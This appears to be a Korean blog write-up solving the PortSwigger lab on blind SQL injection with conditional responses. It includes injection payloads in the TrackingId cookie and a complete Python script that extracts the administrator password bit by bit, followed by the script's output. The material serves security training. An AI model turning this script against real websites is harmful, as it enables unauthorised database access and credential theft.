+++
date = '2026-05-21T11:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Blind SQL injection with conditional responses'
summary = "쿼리 결과나 오류가 노출되지 않는 환경에서, 조건의 참·거짓에 따라 달라지는 응답(Welcome back 메시지)을 신호로 삼아 비밀번호를 비트 단위로 추출하는 Boolean-Based Blind SQL Injection 풀이"
toc = true
tags = ["SQL Injection", "PortSwigger", "PRACTITIONER", "Blind SQLi"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

> ![image.png](/writeup/portswigger/sqli/09/1.png)

Tracking Cookie에 포함된 값이 SQL 쿼리에 직접 사용되며, 이 지점에 Blind SQL Injection 취약점이 존재한다.  
쿼리 결과나 오류 메시지는 응답에 노출되지 않지만, 쿼리가 정상적으로 실행되어 결과가 반환되면 `Welcome back` 메시지가 표시된다. 이 차이를 이용해 `users` 테이블의 administrator 계정 비밀번호를 추출하고 로그인하면 문제가 해결된다.

### SQL Injection 진단

요청은 다음과 같으며, `TrackingId` 쿠키가 주입 지점이다.

```http
GET /filter?category=Gifts HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=<tracking-id>; session=<session>
```

`TrackingId` 값 뒤에 참이 되는 조건 `'AND'1'='1` 을 삽입하면 `Welcome back` 메시지가 표시되고, 거짓이 되는 조건 `'AND'1'='2` 를 삽입하면 메시지가 사라진다.  
조건식의 참·거짓이 응답 차이로 드러나므로, Boolean-Based Blind SQL Injection이 가능하다.

---

## 익스플로잇

먼저 원본 쿼리의 문법을 깨지 않으면서 조건식을 삽입하는 페이로드를 구성한다. 앞쪽 `'` 로 기존 문자열을 닫고, 뒤쪽 `'OR'foo'='` 로 남는 따옴표를 맞춰 구문 오류를 방지한다.

```sql
<tracking-id>'AND'1'='1'OR'foo'='
```

이제 조건식 자리에 비밀번호를 한 문자씩 검사하는 조건을 넣어 전체 문자열을 자동으로 추출한다.  
추출 원리는 다음과 같다. `SUBSTR` 로 대상 문자열에서 문자 하나를 잘라내고, `ASCII` 로 해당 문자의 코드값을 구한 뒤, PostgreSQL의 `::bit(8)::text` 캐스팅으로 8자리 2진 문자열로 변환한다. 그리고 각 비트를 `'1'` 과 비교한다. 이렇게 하면 8번의 요청마다 한 글자를 복원할 수 있다.

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = "<lab-id>.web-security-academy.net"
TRACKING_ID = "<your-tracking-id>"
SESSION = "<your-session>"

def exploit():
    base_url = f"https://{HOST}/filter?category=Gifts"
    flag = ""
    for pos in range(1, 100):
        bit = ""
        for seq in range(1, 9):
            # 추출 대상 쿼리 (필요에 따라 교체)
            # SELECT username||':'||password FROM users WHERE username='administrator'
            value = "SELECT password FROM users WHERE username='administrator'"
            condition = f"SUBSTRING((ASCII(SUBSTR(({value}), {pos}, 1)))::bit(8)::text, {seq}, 1) = '1'"
            payload = f"'AND {condition} OR'foo'='"
            cookies = {
                "TrackingId": TRACKING_ID + payload,
                "session": SESSION,
            }
            response = requests.get(base_url, verify=False, cookies=cookies)
            bit += "1" if "Welcome" in response.text else "0"
        if bit == "00000000":
            break
        flag += chr(int(bit, 2))
        print(f"\rCurrent Value: {flag}", end="")
    print(f"\nExtracted Value: {flag}")

exploit()
```

스크립트를 실행하면 비밀번호가 추출된다.

```
Current Value: 4q70yklv71ucgm68801i
Extracted Value: 4q70yklv71ucgm68801i
```

추출한 administrator 계정 정보로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/09/2.png)

---

## 정리

Blind SQL Injection은 쿼리 결과나 오류가 응답에 직접 노출되지 않는 상황에서, 조건의 참·거짓에 따라 달라지는 응답을 신호로 삼아 데이터를 한 조각씩 추론하는 기법이다. 이 랩에서는 `Welcome back` 메시지의 유무가 그 신호(oracle) 역할을 한다.  
비밀번호를 문자 단위로 비교하면 문자 하나당 문자셋 크기만큼 요청이 필요하지만, ASCII 값을 8비트로 변환해 비트 단위로 비교하면 문자당 8번의 요청으로 줄일 수 있다. 다만 전체 요청 수가 많아 자동화 스크립트 작성이 사실상 필수적이다.